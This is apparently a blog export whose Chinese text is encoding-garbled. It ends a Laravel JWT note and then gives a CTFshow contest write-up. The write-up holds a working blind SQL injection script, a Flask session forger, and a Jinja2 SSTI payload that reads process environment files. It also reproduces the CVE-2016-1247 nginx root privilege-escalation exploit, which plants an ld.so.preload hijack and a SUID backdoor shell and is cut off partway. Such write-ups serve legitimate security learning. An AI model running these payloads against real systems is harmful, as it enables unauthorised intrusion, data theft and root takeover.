<h4 id="éªŒè¯"><a href="#éªŒè¯" class="headerlink" title="éªŒè¯"></a>éªŒè¯</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;è®¤è¯å¯ä»¥å†™åœ¨ä¸­é—´ä»¶ä¸­</span><br><span class="line">&#x2F;&#x2F;é¦–éƒ¨useæ·»åŠ JWTçš„æ‰€æœ‰å¼‚å¸¸ç±»</span><br><span class="line">use Tymon\JWTAuth\Exceptions\JWTException;</span><br><span class="line">use Tymon\JWTAuth\Exceptions\TokenExpiredException;</span><br><span class="line">use Tymon\JWTAuth\Exceptions\TokenInvalidException;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;ä¸€å®šè¦ä½¿ç”¨try catchç‰ˆå¿«æ¥éªŒè¯token,tokençš„éªŒè¯å¤±è´¥,è¿‡æœŸç­‰ç­‰å¼‚å¸¸éƒ½æ˜¯throwä¸€ä¸ªå¼‚å¸¸,ä¸æ•è·å¼‚å¸¸ç¨‹åºç›´æ¥æ­»æ‰äº†,ä¸”é”™è¯¯ä¿¡æ¯ä¸å¯ä»¥å®šä¹‰,å°±ä¼šå¯¼è‡´ä»£ç ä¸ä¸¥è°¨</span><br><span class="line">try &#123;</span><br><span class="line"> 	&#x2F;&#x2F;å®šä¹‰ä¸€ä¸ªAuthç±»æ¥éªŒè¯token,é¦–å…ˆå°†ä¼ è¿‡æ¥çš„tokenç»‘å®šåœ¨ç±»ä¸­</span><br><span class="line">    $token &#x3D; \JWTAuth::setToken($data[&#39;token&#39;]);</span><br><span class="line">    &#x2F;&#x2F;è°ƒç”¨ä»¥ä¸‹æ–¹æ³•å¯ä»¥è·å–tokenä¸­è½½è·çš„æ•°æ®æ¥ä½¿ç”¨</span><br><span class="line">    $user_id&#x3D;$token-&gt;payload()-&gt;get()[&#39;user_id&#39;];</span><br><span class="line">    &#x2F;&#x2F;éªŒè¯token,æ­£ç¡®å°±ä¼šå–å‡ºå…¶ä¸­çš„è½½è·è¿”å›ä¸€ä¸ªåªå«æœ‰è½½è·çš„å¯¹è±¡,</span><br><span class="line">    &#x2F;&#x2F;å¤±è´¥å°±ä¼šæŠ›å‡ºå¼‚å¸¸,å¤±è´¥çš„åŸå› æœ‰è®¸å¤š,è¿‡æœŸ,æ•°æ®æ ¼å¼ä¸å¯¹,æ•´ä¸ªJWTè¿‡æœŸ</span><br><span class="line">    $token-&gt;checkOrFail();</span><br><span class="line">    &#x2F;&#x2F;è¿˜æœ‰ä¸€ä¸ª$token()-&gt;checkæ–¹æ³•å¯ä»¥éªŒè¯token,è¿”å›å€¼ä¸ºbool,éªŒè¯å¤±è´¥ä¸ä¼šæŠ›å‡ºå¼‚å¸¸è€Œæ˜¯è¿”å›false</span><br><span class="line">    &#x2F;&#x2F;æ•è·è¿‡æœŸå¼‚å¸¸ç„¶åå»åˆ·æ–°è¿‡æœŸæ—¶é—´</span><br><span class="line">&#125; catch (TokenExpiredException $e) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        &#x2F;&#x2F;åˆ·æ–°token,è¿”å›å€¼æ˜¯æ›´æ–°è¿‡æœŸæ—¶é—´çš„æ–°token</span><br><span class="line">        $new_token&#x3D;$token-&gt;refresh();</span><br><span class="line">        &#x2F;&#x2F;æ›´æ–°æ•°æ®åº“ä¸­çš„token</span><br><span class="line">        $user&#x3D; User::query()-&gt;where(&#39;user_id&#39;,$user_id)-&gt;first();</span><br><span class="line">        $user-&gt;token&#x3D;$new_token;</span><br><span class="line">        $user-&gt;save();</span><br><span class="line">        &#x2F;&#x2F;å°†æ–°tokenè®¾ç½®åœ¨requestçš„å‚æ•°ä¸­ä¼ ç»™ä¸‹ä¸€ä¸ªè·¯ç”±</span><br><span class="line">        $request-&gt;request-&gt;set(&quot;token&quot;,$new_token);</span><br><span class="line">        &#x2F;&#x2F;å¦‚æœåˆ·æ–°ä¸äº†,ä¹Ÿè¿‡æœŸäº†å°±è¿”å›é”™è¯¯ç è®©ç”¨æˆ·é‡æ–°ç™»å½•</span><br><span class="line">    &#125;catch (TokenExpiredException $e)&#123;</span><br><span class="line">        &#x2F;&#x2F;msgæ˜¯æˆ‘è‡ªå®šä¹‰çš„ç”¨æ¥è¿”å›jsonçš„,ä¸ç”¨ç®¡</span><br><span class="line">        return msg(3,__LINE__);</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;tokenæ ¼å¼é”™è¯¯</span><br><span class="line">&#125; catch (TokenInvalidException $e) &#123;</span><br><span class="line">    return msg(403,$e-&gt;getMessage());</span><br><span class="line">&#125;catch (JWTException $e) &#123;</span><br><span class="line">    return msg(403,$e-&gt;getMessage());</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;å°†requestä¼ ç»™ä¸‹ä¸‹ä¸€ä¸ªè·¯ç”±,åˆ°è¿™é‡Œè®¤è¯ä¾¿æˆåŠŸäº†</span><br><span class="line">return $next($request);</span><br></pre></td></tr></table></figure>
<h3 id="è¯´æ˜"><a href="#è¯´æ˜" class="headerlink" title="è¯´æ˜"></a>è¯´æ˜</h3><p>JWT-oathæ‰©å±•ä¼šåœ¨configç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªjwt.php,é‡Œé¢å®šä¹‰äº†JWTçš„ç›¸å…³é…ç½®</p>
<p>**æ³¨æ„:**è¿™ä¸ªæ‰©å±•æœ‰ä¸¤ç§è¿‡æœŸæ–¹å¼,ä¸€ç§çš„tokenæœ‰æ•ˆæœŸ,æ—¶é—´çŸ­,è¿‡æœŸäº†éœ€è¦åˆ·æ–°,ä¸€ç§æ˜¯åˆ·æ–°æœ‰æ•ˆæœŸ,æ—¶é—´é•¿,åªè¦åœ¨æœ‰æ•ˆæœŸå†…æ‹¿ä¸åœ¨é»‘åå•çš„æ—§tokenæ¥åˆ·æ–°å°±å¯ä»¥,æ—¶é—´ä¸€é•¿ä¸€çŸ­å¯ä»¥ä¸€å®šç¨‹åº¦ä¸Šé˜²æ­¢tokenç›—ç”¨</p>
<p>å¸¸ç”¨é…ç½®</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;jwtæœ‰æ•ˆæœŸ,é»˜è®¤æ˜¯60åˆ†é’Ÿ,å•ä½æ˜¯åˆ†é’Ÿ</span><br><span class="line">JWT_TTL </span><br><span class="line">&#x2F;&#x2F;jwtçš„åˆ·æ–°æœ‰æ•ˆæœŸ,å•ä½æ˜¯åˆ†é’Ÿ,é»˜è®¤æ˜¯20160(14å¤©)</span><br><span class="line">JWT_REFRESH_TTL</span><br><span class="line">&#x2F;&#x2F;æ³¨æ„ä»¥ä¸Šä¸¤ä¸ªæ—¶é—´ä¸å¯ä»¥ç”¨60*24è¿™ç§æ ¼å¼,éœ€è¦è®¾ç½®ä¸º120è¿™æ ·çš„æ•´æ•°</span><br><span class="line">&#x2F;&#x2F;å¿…é¡»å¡«å……çš„è½½è·,åœ¨ä½ è‡ªå·±è®¾å®šè½½è·çš„æ—¶å€™å¿…é¡»å…¨éƒ¨æ‰‹åŠ¨å¡«å……,ä¸ç„¶ä¼šæŠ¥é”™,æ— æ³•ç”Ÿæˆ,ä¸æƒ³è‡ªå®šä¹‰çš„å¯ä»¥æ³¨é‡Šæ‰</span><br><span class="line">    &#39;required_claims&#39; &#x3D;&gt; [</span><br><span class="line">        &#39;iss&#39;,</span><br><span class="line">&#x2F;&#x2F;        &#39;iat&#39;,</span><br><span class="line">&#x2F;&#x2F;        &#39;exp&#39;,</span><br><span class="line">&#x2F;&#x2F;        &#39;nbf&#39;,</span><br><span class="line">&#x2F;&#x2F;        &#39;sub&#39;,</span><br><span class="line">&#x2F;&#x2F;        &#39;jti&#39;,</span><br><span class="line">    ], </span><br><span class="line">&#x2F;&#x2F;issé»˜è®¤æ˜¯ä½¿ç”¨ç”¨äºè¯·æ±‚çš„apiè·¯å¾„</span><br><span class="line">&#x2F;&#x2F;è®¾ç½®é»‘åå•,å½“ä¸ºfalseæ—¶,åˆ·æ–°åç”Ÿæˆæ–°token,æ—§tokenä»ç„¶å¯ä»¥ç”¨</span><br><span class="line">&#x2F;&#x2F;trueéªŒè¯æ—¶å°±ä¼šæŠ›å‡ºé»‘åå•å¼‚å¸¸ä¿¡æ¯</span><br><span class="line">blacklist_enabled</span><br></pre></td></tr></table></figure>
<p>å»ºè®®æ˜¯ä¿®æ”¹.envä¸­çš„ç¯å¢ƒå˜é‡,ä¸è¦ä¿®æ”¹jwt.phpæ–‡ä»¶,å› ä¸ºjwt.phpæ–‡ä»¶ä¸­çš„é…ç½®é¡¹å¤§éƒ½æ˜¯ä».envä¸­è·å–çš„,æ²¡æœ‰è·å–åˆ°ä¼šç”¨é»˜è®¤å€¼</p>
]]></content>
      <categories>
        <category>Note</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>Note</tag>
        <tag>php</tag>
        <tag>laravel</tag>
        <tag>jwt</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFshowå†…éƒ¨èµ›_WP</title>
    <url>/2020/03/29/CTF_WP/ctfshow_%E5%86%85%E9%83%A8%E8%B5%9B/</url>
    <content><![CDATA[<h1 id="CTFshowå†…éƒ¨èµ›-WP"><a href="#CTFshowå†…éƒ¨èµ›-WP" class="headerlink" title="CTFshowå†…éƒ¨èµ›_WP"></a>CTFshowå†…éƒ¨èµ›_WP</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h3><h4 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www.zipæºç æ³„éœ²,ä»£ç å®¡è®¡,register.phpä¸­çš„é»‘åå•é™åˆ¶è¾ƒå°‘,åˆ†æå¯å¾—æ³¨å†Œçš„ç”¨æˆ·åå†™å…¥seesion,ç„¶åç›´æ¥ç”¨sessionä¸­çš„ç”¨æˆ·åå¾…å…¥æŸ¥è¯¢,ä¸2018ç½‘é¼æ¯Unfinishå·®ä¸å¤š,è¯¦æƒ…æœç´¢</span><br></pre></td></tr></table></figure>
<a id="more"></a>

<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re,binascii</span><br><span class="line">login_url &#x3D; &quot;https:&#x2F;&#x2F;eeb03913-664d-4698-b781-e107f8075ea9.chall.ctf.show&#x2F;login.php&quot;</span><br><span class="line">register_url &#x3D; &quot;https:&#x2F;&#x2F;eeb03913-664d-4698-b781-e107f8075ea9.chall.ctf.show&#x2F;register.php&quot;</span><br><span class="line">s&#x3D;requests.session()</span><br><span class="line">users_email &#x3D; [&quot;test&quot; + str(i) + &quot;@qq.com&quot; for i in range(0,17)]</span><br><span class="line">def register(user_email,offset,s):</span><br><span class="line">    reg_datas &#x3D; &#123;</span><br><span class="line">        &quot;e&quot; : user_email,</span><br><span class="line">        #&quot;username&quot; : &quot;0&#39;+(select substr(hex(hex((select * from flag))) from &quot; + str(1+offset*10)+ &quot; for 10))+&#39;0&quot;,</span><br><span class="line">        # &quot;username&quot;:&quot;test&quot;,</span><br><span class="line">        &quot;u&quot;:&quot;0&#39;+(select&#x2F;**&#x2F;substr(hex(hex((select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;flag)))&#x2F;**&#x2F;from&#x2F;**&#x2F;&quot; + str(1+offset*10)+ &quot;&#x2F;**&#x2F;for&#x2F;**&#x2F;10))+&#39;0&quot;,</span><br><span class="line">        &quot;p&quot;:&quot;test&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    # print(reg_datas[&#39;username&#39;])</span><br><span class="line">    r &#x3D; s.post(url &#x3D; register_url,data &#x3D; reg_datas,allow_redirects&#x3D;True)</span><br><span class="line">    # print(r.request.body)</span><br><span class="line">    # print(r.status_code)</span><br><span class="line">    return r</span><br><span class="line">def login(user_email,s):</span><br><span class="line">    login_data&#x3D;&#123;</span><br><span class="line">        &quot;e&quot;:user_email,</span><br><span class="line">        &quot;p&quot;:&quot;test&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    r &#x3D; s.post(url&#x3D;login_url, data&#x3D;login_data, allow_redirects&#x3D;True)</span><br><span class="line">    pattern &#x3D; &#39;Hello\s*(\S*),&#39;</span><br><span class="line">    return re.findall(pattern,r.text)[0]</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    flag_double_hex &#x3D; &#39;&#39;</span><br><span class="line"># email&#x3D;&quot;test@mail.com&quot;</span><br><span class="line"># offset&#x3D;1</span><br><span class="line">    for email,offset in zip(users_email,range(0,len(users_email))):</span><br><span class="line">        print(email,offset)</span><br><span class="line">        r&#x3D;register(email,offset,s)</span><br><span class="line">        test &#x3D; login(email,s)</span><br><span class="line">        print(test)</span><br><span class="line">        flag_double_hex +&#x3D; test</span><br><span class="line">        print(&quot;[+] &quot; + flag_double_hex)</span><br><span class="line">    print(&quot;flag: &quot; + binascii.a2b_hex(binascii.a2b_hex(flag_double_hex)).decode())</span><br></pre></td></tr></table></figure>
<h3 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h3><h4 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h4><p>æŸ¥çœ‹é¡µé¢æºä»£ç æœ‰æç¤º,<code>param:ctfshow key:ican</code></p>
<p>å›¾ç‰‡æ˜¯csséƒ½åœ¨staticæ–‡ä»¶å¤¹ä¸‹,æ²¡æœ‰index.phpç­‰ç­‰,</p>
<p>éšä¾¿ç™»å½•å‘ç°è¦admin,æŸ¥çœ‹cookies,å‘ç°æ˜¯session,æƒ³åˆ°flask</p>
<p>å¼€å§‹ä¼ªé€ adminçš„session</p>
<h4 id="ä¼ªé€ è„šæœ¬"><a href="#ä¼ªé€ è„šæœ¬" class="headerlink" title="ä¼ªé€ è„šæœ¬"></a>ä¼ªé€ è„šæœ¬</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># # coding:utf-8</span><br><span class="line">from flask.sessions import SecureCookieSessionInterface</span><br><span class="line">from itsdangerous import URLSafeTimedSerializer</span><br><span class="line">import hashlib</span><br><span class="line">class SimpleSecureCookieSessionInterface(SecureCookieSessionInterface):</span><br><span class="line">	# Override method</span><br><span class="line">	# Take secret_key instead of an instance of a Flask app</span><br><span class="line">	def get_signing_serializer(self, secret_key):</span><br><span class="line">		if not secret_key:</span><br><span class="line">			return None</span><br><span class="line">		signer_kwargs &#x3D; dict(</span><br><span class="line">			key_derivation&#x3D;&quot;hmac&quot;,</span><br><span class="line">			digest_method&#x3D;hashlib.sha1</span><br><span class="line">		)</span><br><span class="line">		return URLSafeTimedSerializer(secret_key, salt&#x3D;&quot;cookie-session&quot;,</span><br><span class="line">		                              serializer&#x3D;self.serializer,</span><br><span class="line">		                              signer_kwargs&#x3D;signer_kwargs)</span><br><span class="line"></span><br><span class="line">def decodeFlaskCookie(secret_key, cookieValue):</span><br><span class="line">	sscsi &#x3D; SimpleSecureCookieSessionInterface()</span><br><span class="line">	signingSerializer &#x3D; sscsi.get_signing_serializer(secret_key)</span><br><span class="line">	return signingSerializer.loads(cookieValue)</span><br><span class="line"></span><br><span class="line"># Keep in mind that flask uses unicode strings for the</span><br><span class="line"># dictionary keys</span><br><span class="line">def encodeFlaskCookie(secret_key, cookieDict):</span><br><span class="line">	sscsi &#x3D; SimpleSecureCookieSessionInterface()</span><br><span class="line">	signingSerializer &#x3D; sscsi.get_signing_serializer(secret_key)</span><br><span class="line">	return signingSerializer.dumps(cookieDict)</span><br><span class="line"></span><br><span class="line">if __name__&#x3D;&#x3D;&#39;__main__&#39;:</span><br><span class="line">    sk &#x3D; &quot;ican&quot;</span><br><span class="line">    sessionDict &#x3D; &#123;&quot;username&quot;:&quot;admin&quot;&#125;</span><br><span class="line">    cookie &#x3D; encodeFlaskCookie(sk, sessionDict)</span><br><span class="line">    #decodedDict &#x3D; decodeFlaskCookie(sk, session)</span><br><span class="line">    print(cookie)</span><br></pre></td></tr></table></figure>
<p>æ›¿æ¢testçš„sesionåˆ·æ–°é¡µé¢å‘ç°ç¼ºå°‘å‚æ•°,æ·»åŠ ctfshow</p>
<h4 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctfshow&#x3D;1</span><br><span class="line">#é¡µé¢æ˜¾ç¤º1</span><br><span class="line">ctfshow&#x3D;&#123;&#123;1*2&#125;&#125;</span><br><span class="line">#é¡µé¢æ˜¾ç¤º2</span><br></pre></td></tr></table></figure>
<p>å¯çŸ¥æ˜¯SSTI</p>
<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?ctfshow&#x3D;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;cat &#x2F;proc&#x2F;1&#x2F;environ&#39;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
<p>ps -auxå‘ç°æ‰§è¡Œäº†/flag.sh,ä½†æ˜¯æ ¹ç›®å½•ä¸‹é¢æ²¡æœ‰,è¯»å–procä¸‹é¢çš„ä¸€äº›æ–‡ä»¶è¯•è¯•,å¾—åˆ°flag</p>
<h3 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h3><h4 id="åˆ†æ-2"><a href="#åˆ†æ-2" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h4><p>é¢˜ç›®å›¾ç‰‡ä¸­æœ‰caiå­—æ ·</p>
<p>èšå‰‘è¿æ¥,å¯†ç æ˜¯cai</p>
<p>flagåœ¨/ä¸‹é¢,ä½†æ˜¯æ²¡æœ‰æƒé™</p>
<p>ç»ˆç«¯è¿è¡Œps -aux</p>
<p>å¾—åˆ°cron,cronæ˜¯linuxçš„å®šæ—¶ä»»åŠ¡,cat /etc/crontabæ–‡ä»¶å¾—åˆ°æœ€ä¸‹é¢ä¸€è¡Œçš„nginxçš„æ—¥å¿—åˆ‡ç‰‡ç¨‹åº,ä¸€æ­¥æ­¥æŸ¥çœ‹æ–‡ä»¶æ·±å…¥åˆ°/var/logç›®å½•ä¸‹,ls -af,å¾—åˆ°error.logæ˜¯rootæƒé™,æœä¸€æœå¾—åˆ°nginxé”™è¯¯é…ç½®error.log rootæƒé™çš„ææƒæ¼æ´</p>
<h4 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">#</span><br><span class="line"># Nginx (Debian-based distros) - Root Privilege Escalation PoC Exploit</span><br><span class="line"># nginxed-root.sh (ver. 1.0)</span><br><span class="line">#</span><br><span class="line"># CVE-2016-1247</span><br><span class="line">#</span><br><span class="line"># Discovered and coded by:</span><br><span class="line">#</span><br><span class="line"># Dawid Golunski</span><br><span class="line"># dawid[at]legalhackers.com</span><br><span class="line">#</span><br><span class="line"># https:&#x2F;&#x2F;legalhackers.com</span><br><span class="line">#</span><br><span class="line"># Follow https:&#x2F;&#x2F;twitter.com&#x2F;dawid_golunski for updates on this advisory.</span><br><span class="line">#</span><br><span class="line"># ---</span><br><span class="line"># This PoC exploit allows local attackers on Debian-based systems (Debian, Ubuntu</span><br><span class="line"># etc.) to escalate their privileges from nginx web server user (www-data) to root </span><br><span class="line"># through unsafe error log handling.</span><br><span class="line">#</span><br><span class="line"># The exploit waits for Nginx server to be restarted or receive a USR1 signal.</span><br><span class="line"># On Debian-based systems the USR1 signal is sent by logrotate (&#x2F;etc&#x2F;logrotate.d&#x2F;nginx)</span><br><span class="line"># script which is called daily by the cron.daily on default installations.</span><br><span class="line"># The restart should take place at 6:25am which is when cron.daily executes.</span><br><span class="line"># Attackers can therefore get a root shell automatically in 24h at most without any admin</span><br><span class="line"># interaction just by letting the exploit run till 6:25am assuming that daily logrotation </span><br><span class="line"># has been configured. </span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line"># Exploit usage:</span><br><span class="line"># .&#x2F;nginxed-root.sh path_to_nginx_error.log </span><br><span class="line">#</span><br><span class="line"># To trigger logrotation for testing the exploit, you can run the following command:</span><br><span class="line">#</span><br><span class="line"># &#x2F;usr&#x2F;sbin&#x2F;logrotate -vf &#x2F;etc&#x2F;logrotate.d&#x2F;nginx</span><br><span class="line">#</span><br><span class="line"># See the full advisory for details at:</span><br><span class="line"># https:&#x2F;&#x2F;legalhackers.com&#x2F;advisories&#x2F;Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html</span><br><span class="line">#</span><br><span class="line"># Video PoC:</span><br><span class="line"># https:&#x2F;&#x2F;legalhackers.com&#x2F;videos&#x2F;Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line"># Disclaimer:</span><br><span class="line"># For testing purposes only. Do no harm.</span><br><span class="line">#</span><br><span class="line"># http:&#x2F;&#x2F;www.debian.cn&#x2F;</span><br><span class="line">#</span><br><span class="line">BACKDOORSH&#x3D;&quot;&#x2F;bin&#x2F;bash&quot;</span><br><span class="line">BACKDOORPATH&#x3D;&quot;&#x2F;tmp&#x2F;nginxrootsh&quot;</span><br><span class="line">PRIVESCLIB&#x3D;&quot;&#x2F;tmp&#x2F;privesclib.so&quot;</span><br><span class="line">PRIVESCSRC&#x3D;&quot;&#x2F;tmp&#x2F;privesclib.c&quot;</span><br><span class="line">SUIDBIN&#x3D;&quot;&#x2F;usr&#x2F;bin&#x2F;sudo&quot;</span><br><span class="line">function cleanexit &#123;</span><br><span class="line"># Cleanup </span><br><span class="line">echo -e &quot;\n[+] Cleaning up...&quot;</span><br><span class="line">rm -f $PRIVESCSRC</span><br><span class="line">rm -f $PRIVESCLIB</span><br><span class="line">rm -f $ERRORLOG</span><br><span class="line">touch $ERRORLOG</span><br><span class="line">if [ -f &#x2F;etc&#x2F;ld.so.preload ]; then</span><br><span class="line">echo -n &gt; &#x2F;etc&#x2F;ld.so.preload</span><br><span class="line">fi</span><br><span class="line">echo -e &quot;\n[+] Job done. Exiting with code $1 \n&quot;</span><br><span class="line">exit $1</span><br><span class="line">&#125;</span><br><span class="line">function ctrl_c() &#123;</span><br><span class="line">        echo -e &quot;\n[+] Ctrl+C pressed&quot;</span><br><span class="line">cleanexit 0</span><br><span class="line">&#125;</span><br><span class="line">#intro </span><br><span class="line">cat &lt;&lt;_eascii_</span><br><span class="line"> _______________________________</span><br><span class="line">&lt; Is your server (N)jinxed ? ;o &gt;</span><br><span class="line"> -------------------------------</span><br><span class="line">           \ </span><br><span class="line">            \          __---__</span><br><span class="line">                    _-       &#x2F;--______</span><br><span class="line">               __--( &#x2F;     \ )XXXXXXXXXXX\v.  </span><br><span class="line">             .-XXX(   O   O  )XXXXXXXXXXXXXXX- </span><br><span class="line">            &#x2F;XXX(       U     )        XXXXXXX\ </span><br><span class="line">          &#x2F;XXXXX(              )--_  XXXXXXXXXXX\ </span><br><span class="line">         &#x2F;XXXXX&#x2F; (      O     )   XXXXXX   \XXXXX\ </span><br><span class="line">         XXXXX&#x2F;   &#x2F;            XXXXXX   \__ \XXXXX</span><br><span class="line">         XXXXXX__&#x2F;          XXXXXX         \__----&gt;</span><br><span class="line"> ---___  XXX__&#x2F;          XXXXXX      \__         &#x2F;</span><br><span class="line">   \-  --__&#x2F;   ___&#x2F;\  XXXXXX            &#x2F;  ___--&#x2F;&#x3D;</span><br><span class="line">    \-\    ___&#x2F;    XXXXXX              &#39;--- XXXXXX</span><br><span class="line">       \-\&#x2F;XXX\ XXXXXX                      &#x2F;XXXXX</span><br><span class="line">         \XXXXXXXXX   \                    &#x2F;XXXXX&#x2F;</span><br><span class="line">          \XXXXXX      &gt;                 _&#x2F;XXXXX&#x2F;</span><br><span class="line">            \XXXXX--__&#x2F;              __-- XXXX&#x2F;</span><br><span class="line">             -XXXXXXXX---------------  XXXXXX-</span><br><span class="line">                \XXXXXXXXXXXXXXXXXXXXXXXXXX&#x2F;</span><br><span class="line">                  &quot;&quot;VXXXXXXXXXXXXXXXXXXV&quot;&quot;</span><br><span class="line">_eascii_</span><br><span class="line">echo -e &quot;\033[94m \nNginx (Debian-based distros) - Root Privilege Escalation PoC Exploit (CVE-2016-1247) \nnginxed-root.sh (ver. 1.0)\n&quot;</span><br><span class="line">echo -e &quot;Discovered and coded by: \n\nDawid Golunski \nhttps:&#x2F;&#x2F;legalhackers.com \033[0m&quot;</span><br><span class="line"># Args</span><br><span class="line">if [ $# -lt 1 ]; then</span><br><span class="line">echo -e &quot;\n[!] Exploit usage: \n\n$0 path_to_error.log \n&quot;</span><br><span class="line">echo -e &quot;It seems that this server uses: &#96;ps aux | grep nginx | awk -F&#39;log-error&#x3D;&#39; &#39;&#123; print $2 &#125;&#39; | cut -d&#39; &#39; -f1 | grep &#39;&#x2F;&#39;&#96;\n&quot;</span><br><span class="line">exit 3</span><br><span class="line">fi</span><br><span class="line"># Priv check</span><br><span class="line">echo -e &quot;\n[+] Starting the exploit as: \n\033[94m&#96;id&#96;\033[0m&quot;</span><br><span class="line">id | grep -q www-data</span><br><span class="line">if [ $? -ne 0 ]; then</span><br><span class="line">echo -e &quot;\n[!] You need to execute the exploit as www-data user! Exiting.\n&quot;</span><br><span class="line">exit 3</span><br><span class="line">fi</span><br><span class="line"># Set target paths</span><br><span class="line">ERRORLOG&#x3D;&quot;$1&quot;</span><br><span class="line">if [ ! -f $ERRORLOG ]; then</span><br><span class="line">echo -e &quot;\n[!] The specified Nginx error log ($ERRORLOG) doesn&#39;t exist. Try again.\n&quot;</span><br><span class="line">exit 3</span><br><span class="line">fi</span><br><span class="line"># [ Exploitation ]</span><br><span class="line">trap ctrl_c INT</span><br><span class="line"># Compile privesc preload library</span><br><span class="line">echo -e &quot;\n[+] Compiling the privesc shared library ($PRIVESCSRC)&quot;</span><br><span class="line">cat &lt;&lt;_solibeof_&gt;$PRIVESCSRC</span><br><span class="line">#define _GNU_SOURCE</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;stat.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;dlfcn.h&gt;</span><br><span class="line">       #include &lt;sys&#x2F;types.h&gt;</span><br><span class="line">       #include &lt;sys&#x2F;stat.h&gt;</span><br><span class="line">       #include &lt;fcntl.h&gt;</span><br><span class="line">uid_t geteuid(void) &#123;</span><br><span class="line">static uid_t  (*old_geteuid)();</span><br><span class="line">old_geteuid &#x3D; dlsym(RTLD_NEXT, &quot;geteuid&quot;);</span><br><span class="line">if ( old_geteuid() &#x3D;&#x3D; 0 ) &#123;</span><br><span class="line">chown(&quot;$BACKDOORPATH&quot;, 0, 0);</span><br><span class="line">chmod(&quot;$BACKDOORPATH&quot;, 04777);</span><br><span class="line">unlink(&quot;&#x2F;etc&#x2F;ld.so.preload&quot;);</span><br><span class="line">&#125;</span><br><span class="line">return old_geteuid();</span><br><span class="line">&#125;</span><br><span class="line">_solibeof_</span><br><span class="line">&#x2F;bin&#x2F;bash -c &quot;gcc -Wall -fPIC -shared -o $PRIVESCLIB $PRIVESCSRC -ldl&quot;</span><br><span class="line">if [ $? -ne 0 ]; then</span><br><span class="line">echo -e &quot;\n[!] Failed to compile the privesc lib $PRIVESCSRC.&quot;</span><br><span class="line">cleanexit 2;</span><br><span class="line">fi</span><br><span class="line"># Prepare backdoor shell</span><br><span class="line">cp $BACKDOORSH $BACKDOORPATH</span><br><span class="line">echo -e &quot;\n[+] Backdoor&#x2F;low-priv shell installed at: \n&#96;ls -l $BACKDOORPATH&#96;&quot;</span><br><span class="line"># Safety check</span><br><span class="line">if [ -f &#x2F;etc&#x2F;ld.so.preload ]; then</span><br><span class="line">echo -e &quot;\n[!] &#x2F;etc&#x2F;ld.so.preload already exists. Exiting for safety.&quot;</span><br><span class="line">exit 2</span><br><span class="line">fi</span><br><span class="line"># Symlink the log file</span><br><span class="line">rm -f $ERRORLOG &amp;&amp; ln -s &#x2F;etc&#x2F;ld.so.preload $ERRORLOG</span><br><span class="line">if [ $? -ne 0 ]; then</span><br><span class="line">echo -e &quot;\n[!] Couldn&#39;t remove the $ERRORLOG file or create a symlink.&quot;</span><br><span class="line">cleanexit 3</span><br><span class="line">fi</span><br><span class="line">echo -e &quot;\n[+] The server appears to be \033[94m(N)jinxed\033[0m (writable logdir) ! :) Symlink created at: \n&#96;ls -l $ERRORLOG&#96;&quot;</span><br><span class="line"># Make sure the nginx access.log contains at least 1 line for the logrotation to get triggered</span><br><span class="line">curl http:&#x2F;&#x2F;localhost&#x2F; &gt;&#x2F;dev&#x2F;null 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line"># Wait for Nginx to re-open the logs&#x2F;USR1 signal after the logrotation (if daily </span><br><span class="line"># rotation is enable in logrotate config for nginx, this should happen within 24h at 6:25am)</span><br><span class="line">echo -ne &quot;\n[+] Waiting for Nginx service to be restarted (-USR1) by logrotate called from cron.daily at 6:25am...&quot;</span><br><span class="line">while :; do </span><br><span class="line">sleep 1</span><br><span class="line">if [ -f &#x2F;etc&#x2F;ld.so.preload ]; then</span><br><span class="line">echo $PRIVESCLIB &gt; &#x2F;etc&#x2F;ld.so.preload</span><br><span 